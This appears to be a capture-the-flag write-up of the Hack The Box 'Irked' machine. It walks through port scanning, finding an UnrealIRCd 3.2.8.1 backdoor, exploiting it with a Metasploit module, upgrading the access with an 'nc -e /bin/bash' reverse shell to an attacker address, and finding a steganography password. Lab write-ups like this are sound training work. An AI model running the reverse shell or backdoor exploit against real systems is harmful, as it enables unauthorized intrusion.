## User
To begin the enumeration process, a port scan was run against the target using `masscan`. The purpose of this intial scan is to quickly determine which ports are open so that a more focused `nmap` scan can be performed that will target only the open ports discovered by `masscan`.

```
root@kali:~/workspace/hackthebox/Access# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.117

```

From `masscan`, it was revealed that a variety of ports were listening for connections, as shown in the command output below.

```
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 8067/tcp on 10.10.10.117                                  
Discovered open port 65534/tcp on 10.10.10.117                                 
Discovered open port 80/tcp on 10.10.10.117                                    
Discovered open port 111/tcp on 10.10.10.117                                   
Discovered open port 22/tcp on 10.10.10.117                                    
Discovered open port 50167/tcp on 10.10.10.117                                 
Discovered open port 6697/tcp on 10.10.10.117 
...
```

Using this information, a second scan was run using `nmap` to more thoughoughly examine the services listening on the discovered ports.

```
root@kali:~/workspace/hackthebox/Access# nmap -p 8067,65534,80,111,22,50167,6697 -sC -sV -oA scans/discovered-tcp 10.10.10.117
```

While this scan is running, it's a good idea to check out what might be happening on well-known ports such as the HTTP port TCP 80.



The results of the nmap scan revealed some interesting services listening on some uncommon ports, which suggest a good starting place for further enumeration. Note that in general, it is wise to take a broad approach during the initial enumeration process. That is to say that basic enumeration of each listening service should be completed before moving on to more focused enumeration of any particular service. In this write-up, the basic enumeration techniques are not discussed. A screenshot of the result of the nmap scan is shown below.

Of particular interest is the UnrealIRCd service running on TCP ports 6697, 8067, and 65534.

Using an IRC client such as `hexchat`, the IRC service listening on port 6697 can be accessed. If necesary, `hexchat` can be installed using `apt-get install hexchat`. Upon connecting to the service, the server announces the running version of UnrealIRCd as 3.2.8.1. This is shown in the screenshot below.

![irc_version](/assets/images/htb/irked/irc_version.png)

SLesser-known and outdated services are often vulnerable to exploitation. The `searchsploit` tool can be used to search for exploits relevant to a given service. Now that the version of UnrealIRCd running on the target server is known, the command shown below can be used to search for vulnerabliities and exploits relevant to UnrealIRCd 3.2.8.1.

```
root@kali:~/workspace/hackthebox/Irked# searchsploit "UnrealIRCd 3.2.8.1"
```

The results of the search reveal that thare are a variety of exploits related to this version of UnrealIRCd, including a backdoor command exeuction Metasploit module.

![searchsploit_results](/assets/images/htb/irked/searchsploit_results.png)

The Metasploit Framework can be accessed via command line with the `msfconsole` command. Within `msfconsole`, the `exploit/unix/irc/unreal_ircd_3281_backdoor` module can be loaded and ran against the target using the options shown below.

![msfconsole_exploit](/assets/images/htb/irked/msfconsole_exploit.png)

Running this module with the `run` command results in a shell on the system as the `ircd` user. This session can be upgraded to a more stable shell by first connecting back to the attacking system once again, but this time outisde of `msfconsole`. In a new window on the attacking system, a listener should be set up before issuing the `nc -e /bin/bash 10.10.14.2 4444` command on the target system. From the session created over this connection, the shell can be upgraded, as demonstrated below.

![shell_upgrade](/assets/images/htb/irked/shell_upgrade.png)

In the `/home` directory of the target system there are two users; `ircd` and `djmardov`. The flag `user.txt` file is in the `/home/djamardov/Documents` directory, but cannot be read by the current `ircd` user. In this same directory, however, there is a file called `.backup`, the contents of which are shown below.

```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

For those unfamiliar with steg, the word "steg" is short for "steganography" and is the practice of concealing a file, message, image, or video within another file, message, image or video. The contents of the `.backup` file in the home directory of `djmardov` suggets that there must be some information hidden in another file, and that `UPupDOWNdownLRlrBAbaSSss` must be the password to access the information.
